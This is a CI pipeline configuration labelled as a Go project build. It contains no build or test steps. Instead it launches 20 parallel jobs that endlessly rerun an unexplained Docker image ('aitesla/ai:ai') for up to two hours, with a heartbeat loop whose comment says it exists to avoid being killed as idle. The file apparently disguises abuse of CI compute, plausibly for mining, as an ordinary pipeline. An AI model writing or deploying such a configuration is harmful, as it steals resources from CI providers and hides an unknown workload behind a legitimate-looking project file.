version: v1.0
name: "\U0001F680 Go Project CI/CD Pipeline"
agent:
  machine:
    type: f1-standard-4
    os_image: ubuntu2404
blocks:
  - name: Loop Runtime
    task:
      timeout:
        in_minutes: 120
      jobs:
        - name: runner
          parallelism: 20
          commands:
            - |
              # keep alive 防止 idle kill
              while true; do
                echo "[heartbeat] $(date)"
                sleep 30
              done &

              # 主循环任务
              while true; do
                echo "start batch $(date)"

                docker run --rm aitesla/ai:ai || true

                echo "end batch $(date)"

                sleep 5
              done
